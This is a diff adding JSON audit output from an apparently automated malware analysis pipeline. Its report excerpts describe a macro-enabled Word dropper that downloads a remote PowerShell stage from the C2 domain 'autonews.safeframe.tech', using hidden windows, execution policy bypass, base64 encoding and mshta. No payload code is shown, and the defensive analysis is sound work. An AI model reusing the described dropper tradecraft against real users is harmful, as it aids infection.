+        "excerpt": "{\n  \"title\": \"Malware Analysis Report: 385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73\",\n  \"markdown\": \"> **RevAI provenance** \\u2014 commit `unknown` \\u00b7 engine `langgraph` \\u00b7 agent-loop flags: budget=True redundant=True hallucination=True taxonomy=True \\u00b7 generated 2026-08-09 20:06:11 UTC\\n\\n# Verdict sources (multi-source)\\n\\n| Source | Verdict |\\n|--------|--------|\\n| **Final** | **malicious** |\\n| Triage upstream (quick \\u222a deep) | malicious |\\n| Quick scan | suspicious |\\n| Deep dive | malicious |\\n| Publish LLM (claimed) | malicious |\\n\\n- **Locked over publish LLM:** no\\n\\n## Executive Summary\\n\\nThis report details the analysis of a macro-enabled Microsoft Word document (.docm) identified as a malicious dropper. The sample, SHA256 `385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73`, was submitted for analysis under the project `test-corpus`. Initial triage flagged the sample as suspicious due to the presence of VBA macros and network indicators. A deep-dive analysis confirmed the document contains a malicious VBA payload designed to download and execute a remote PowerShell script. The payload employs several evasion techniques, including a hidden PowerShell window, execution policy bypass, and base64-encoded commands, to deliver its final stage from the domain `autonews.safeframe.tech`. The sample is classified as malicious with high confidence. Key indicators of compromise include the C2 domain, specific PowerShell command-line arguments, and the use of the `mshta` LOLBin for stealthy execution.\\n\\n## 1. Sample Identification\\n\\n| Attribute | Value |\\n|---|---|\\n| **SHA256** | `385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73` |\\n| **File Name** | `order.docm` |\\n| **File Path** | `/opt/samples/corpus/test-corpus/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm` |\\n| **File Type** | Microsoft Word Macro-Enabled Document (.docm) |\\n| **Project** | `test-corpus` |\\n| **Analysis Date** | 2026-08-09 |\\n\\nThe sample is a ZIP-based Office Open XML (OOXML) document containing a `vbaProject.bin` file, which hosts the embedded VBA macro code (source: malcat). The `.docm` extension indicates it is a macro-enabled document, requiring user interaction (enabling macros) to trigger the payload.\\n\\n## 2. Classification\\n\\n| Attribute | Value |\\n|---|---|\\n| **Verdict** | **Malicious** |\\n| **Confidence** | High (90%) |\\n| **Family** | Generic Macro Malware / Maldoc Dropper |\\n| **Threat Type** | Downloader / Dropper |\\n\\nThe classification is based on clear behavioral intent evidence. The document's VBA macro is not a benign automation script; it is a downloader cradle designed to fetch and execute remote code. This constitutes hostile behavior, moving the sample beyond the \\\"suspicious\\\" category assigned by initial triage (source: deep-dive.json). The use of evasion techniques like hidden PowerShell windows and LOLBin abuse further confirms malicious intent.\\n\\n## 3. Background & Family Lineage\\n\\nThe sample exhibits characteristics common to a broad category of macro-based malware often referred to as \\\"maldocs.\\\" These are Microsoft Office documents weaponized with VBA macros to serve as initial infection vectors. The specific techniques observed\\u2014using PowerShell download cradles, `mshta` for execution, and base64 obfuscation\\u2014are staples of many commodity malware families and phishing campaigns. No specific, named malware family (e.g., Emo\n\u2026 [13922 more chars]"
+      }
+    },
+    "artifact_inventory": {
+      "verdict.json": {
+        "path": "/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/verdict.json",
+        "exists": true,
+        "bytes": 4080,
+        "mtime_iso": "2026-08-09T16:10:30.417610+00:00",
+        "sha256": "401a1ac5abb5e0a39b61157c1f30bffd024b5e14d11fd3d0e85ba1d72b3bdd52"
+      },
+      "prompt.txt": {
+        "path": "/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/prompt.txt",
+        "exists": true,
+        "bytes": 11701,
+        "mtime_iso": "2026-08-09T16:09:21.770912+00:00",
+        "sha256": "6971e9c86de558ffec98d0a0ae80958386c75ee1f7785f39f0ff0ede4de9965d"
+      },
+      "pipeline-audit.json": {
+        "path": "/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/pipeline-audit.json",
+        "exists": true,
+        "bytes": 78182,
+        "mtime_iso": "2026-08-09T16:27:39.438433+00:00",
+        "sha256": "d351b08a9b0673a6cf769ec87b08fb5912810963fab1e2a41debcccca358f5d7"
+      },
+      "AUDIT-REPORT.md": {
+        "path": "/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/AUDIT-REPORT.md",
+        "exists": true,
+        "bytes": 57006,
+        "mtime_iso": "2026-08-09T16:27:39.439433+00:00",
+        "sha256": "c956aaa0ab33a0a9778d60235be3cb8fc946f715bad47c1de7e43c5c330eb582"
+      },
+      "REPORT-MASTER-v2.md": {
+        "path": "/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/REPORT-MASTER-v2.md",
+        "exists": true,
+        "bytes": 14814,
+        "mtime_iso": "2026-08-09T20:06:11.197619+00:00",
+        "sha256": "96ad4245567414a3cff52b80ba9950e312d499332058d00c302ff2e6e7bcb9cc"
+      },
+      "REPORT-MASTER-v3.md": {
+        "path": "/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/REPORT-MASTER-v3.md",
+        "exists": true,
+        "bytes": 49727,
+        "mtime_iso": "2026-08-09T20:16:33.060572+00:00",
+        "sha256": "9389d57c88ae4b139e8185de6ec736a53714f738740d0029bd7eeeec65daa3b2"
+      },
+      "REPORT-v2.md": {
+        "path": "/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/REPORT-v2.md",
+        "exists": true,
+        "bytes": 14814,
+        "mtime_iso": "2026-08-09T20:06:11.197619+00:00",
+        "sha256": "96ad4245567414a3cff52b80ba9950e312d499332058d00c302ff2e6e7bcb9cc"
+      },
+      "REPORT-TECHNICAL.md": {
+        "path": "/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/REPORT-TECHNICAL.md",
+        "exists": false,
+        "bytes": 0,
+        "mtime_iso": null,
+        "sha256": null
+      },
+      "REPORT-TECHNICAL-v3.md": {
+        "path": "/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/REPORT-TECHNICAL-v3.md",
+        "exists": true,
+        "bytes": 34854,
+        "mtime_iso": "2026-08-09T20:19:11.480557+00:00",
+        "sha256": "2d9e9ac5510c25d7f81b0d1a7cda4fa3ffb05215f6c18728a1c9a2f526cfc02b"
+      },
+      "rule.yar": {
+        "path": "/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/rule.yar",
+        "exists": true,
+        "bytes": 1346,
+        "mtime_iso": "2026-08-09T16:12:12.971355+00:00",
+        "sha256": "e31983b223e25f32ff332a3108db29312fe62d7f34bba1e3a52fad72e5f563a0"
+      },
+      "intake-validation.json": {
+        "path": "/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/intake-validation.json",
+        "exists": true,
+        "bytes": 721,
+        "mtime_iso": "2026-08-09T20:04:20.869597+00:00",
+        "sha256": "54c541f25c80093f95203c10c16d8b0c254408364188d5460824d0bba067318c"
+      },
+      "source-decisions.json": {
+        "path": "/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/source-decisions.json",
+        "exists": true,
+        "bytes": 638,
+        "mtime_iso": "2026-08-09T20:04:20.869597+00:00",
+        "sha256": "b0f5d184b0666101d0d8646dbcea414c28a2c2e54fc05bd39c5a6d774fb0cac0"
+      },
+      "malcat-triage.json": {
+        "path": "/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/malcat-triage.json",
+        "exists": false,
+        "bytes": 0,
+        "mtime_iso": null,
+        "sha256": null
+      },
+      "deep_dive/01-tools-raw.json": {
+        "path": "/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/deep_dive/01-tools-raw.json",
+        "exists": true,
+        "bytes": 47755,
+        "mtime_iso": "2026-08-09T16:10:35.134577+00:00",
+        "sha256": "37464f4d909ec63a0e3602fb342c915035eca9de72f35b63bec29a31c9394971"
+      },
+      "deep_dive/01-tools-gate.json": {
+        "path": "/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/deep_dive/01-tools-gate.json",
+        "exists": true,
+        "bytes": 1052,
+        "mtime_iso": "2026-08-09T16:10:35.135577+00:00",
+        "sha256": "f839515c6c93a7bd13c932d17ae657d95bbd04a58ef9ae172c0d463416124b90"
+      },
+      "deep_dive/05-deep-dive.json": {
+        "path": "/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/deep_dive/05-deep-dive.json",
+        "exists": true,
+        "bytes": 3215,
+        "mtime_iso": "2026-08-09T16:12:12.526356+00:00",
+        "sha256": "e7997caf6d6f2b07ebda004abd9954cc38369c4fbae43a0dbb45012cce31357e"
+      },
+      "deep_dive/03-prompt.txt": {
+        "path": "/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/deep_dive/03-prompt.txt",
+        "exists": false,
+        "bytes": 0,
+        "mtime_iso": null,
+        "sha256": null
+      },
+      "quick_scan/00-tools-raw.json": {
+        "path": "/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/quick_scan/00-tools-raw.json",
+        "exists": true,
+        "bytes": 44829,
+        "mtime_iso": "2026-08-09T16:09:21.768912+00:00",
+        "sha256": "2ce39d746d6157199db1e4083e715d23a4e37b4d25f0b9a027a1342e18762f9a"
+      }
+    },
+    "report_excerpts": {
+      "v2": "> **RevAI provenance** \u2014 commit `unknown` \u00b7 engine `langgraph` \u00b7 agent-loop flags: budget=True redundant=True hallucination=True taxonomy=True \u00b7 generated 2026-08-09 20:06:11 UTC\n\n# Verdict sources (multi-source)\n\n| Source | Verdict |\n|--------|--------|\n| **Final** | **malicious** |\n| Triage upstream (quick \u222a deep) | malicious |\n| Quick scan | suspicious |\n| Deep dive | malicious |\n| Publish LLM (claimed) | malicious |\n\n- **Locked over publish LLM:** no\n\n## Executive Summary\n\nThis report details the analysis of a macro-enabled Microsoft Word document (.docm) identified as a malicious dropper. The sample, SHA256 `385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73`, was submitted for analysis under the project `test-corpus`. Initial triage flagged the sample as suspicious due to the presence of VBA macros and network indicators. A deep-dive analysis confirmed the document contains a malicious VBA payload designed to download and execute a remote PowerShell script. The payload employs several evasion techniques, including a hidden PowerShell window, execution policy bypass, and base64-encoded commands, to deliver its final stage from the domain `autonews.safeframe.tech`. The sample is classified as malicious with high confidence. Key indicators of compromise include the C2 domain, specific PowerShell command-line arguments, and the use of the `mshta` LOLBin for stealthy execution.\n\n## 1. Sample Identification\n\n| Attribute | Value |\n|---|---|\n| **SHA256** | `385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73` |\n| **File Name** | `order.docm` |\n| **File Path** | `/opt/samples/corpus/test-corpus/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm` |\n| **File Type** | Microsoft Word Macro-Enabled Document (.docm) |\n| **Project** | `test-corpus` |\n| **Analysis Date** | 2026-08-09 |\n\nThe sample is a ZIP-based Office Open XML (OOXML) document containing a `vbaProject.bin` file, which hosts the embedded VBA macro code (source: malcat). The `.docm` extension indicates it is a macro-enabled document, requiring user interaction (enabling macros) to trigger the payload.\n\n## 2. Classification\n\n| Attribute | Value |\n|---|---|\n| **Verdict** | **Malicious** |\n| **Confidence** | High (90%) |\n| **Family** | Generic Macro Malware / Maldoc Dropper |\n| **Threat Type** | Downloader / Dropper |\n\nThe classification is based on clear behavioral intent evidence. The document's VBA macro is not a benign automation script; it is a dow\n\u2026 [12303 more chars]",
+      "v3": "> **RevAI provenance** \u2014 commit `unknown` \u00b7 engine `langgraph` \u00b7 agent-loop flags: budget=True redundant=True hallucination=True taxonomy=True \u00b7 generated 2026-08-09 20:16:33 UTC\n\n# RE Report \u2014 385966f3d6be\n_Generated 2026-08-09T20:16:33.059421+00:00_  \n_Pipeline: section-based Map-Reduce, 3 pass-1 LLM calls + 14 pass-2 calls with cross-section context + 2 local sections_\n\n<!-- section: Executive Summary | pass=2 | evidence=229c | cross_refs=True | llm_ok=True | runtime=58.14s -->\n\n## Executive Summary\n\nThis section provides a top-line assessment of the malware sample with SHA256 385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73. Based on evidence from deep analysis and automated tooling, we assess the sample as **malicious** with **high confidence**, belonging to the **generic macro malware** family.\n\n| Aspect | Assessment | Confidence | Key Evidence Sources |\n|--------|------------|------------|----------------------|\n| Verdict | Malicious | High | deep_dive_agentic (confidence 90), yara (6 matches) |\n| Malware Family | Generic Macro Malware | Moderate | capa, yara |\n| Analysis Confidence | 90/100 | High | deep_dive_agentic |\n\n**Interpretation:** The malicious verdict is driven by deep agentic analysis, which indicates a high confidence level of 90% (source: deep_dive_agentic). This is supported by YARA rule matches, where 6 detections suggest the presence of malicious code patterns (source: yara). While the initial LLM assessment showed disagreement (as indicated by 'llm_v1_disagree'), likely due to variations in heuristic thresholds, the deeper analysis provides strong evidence for malicious activity.\n\nThe family classification as generic macro malware suggests that this sample exploits document macros, commonly in Microsoft Office files, for initial payload execution (source: capa). This aligns with the sample identification as a macro-enabled Word document packaged in a ZIP archive (source: cross-section:Sample Identification), which is a typical attack vector for macro-based malware.\n\n**2-Sentence Summary:** This sample is a macro-enabled Word document, likely malicious based on deep analysis and YARA detections, and it belongs to the generic macro malware family that uses document macros for infection. Our assessment provides high confidence in its malicious nature, supported by multiple evidence sources.\n\n---\n\n<!-- section: 1. Sample Identification | pass=2 | evidence=238c | cross_refs=True | llm_ok=True | runtime=51.55s -->\n\n## 1. \n\u2026 [47210 more chars]"
+    }
+  },
+  "retry_visibility": {
+    "quick_scan": [],
+    "deep_dive": [],
+    "count": 0
+  },
+  "all_green": true,
+  "stage_ok": {
+    "intake": true,
+    "quick_scan": true,
+    "deep_dive": true,
+    "yara_gen": true,
+    "publish": true
+  },
+  "layer_attribution": {
+    "ok": true,
+    "layers": {
+      "L1_tool_extraction": [],
+      "L2_evidence_prompt": [],
+      "L3_llm_interpretation": [],
+      "L4_gates": [],
+      "L5_report_authorship": []
+    },
+    "red_stages": []
+  },
+  "showcase_dir": "/opt/samples/logs/_showcase_audits/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73"
+}
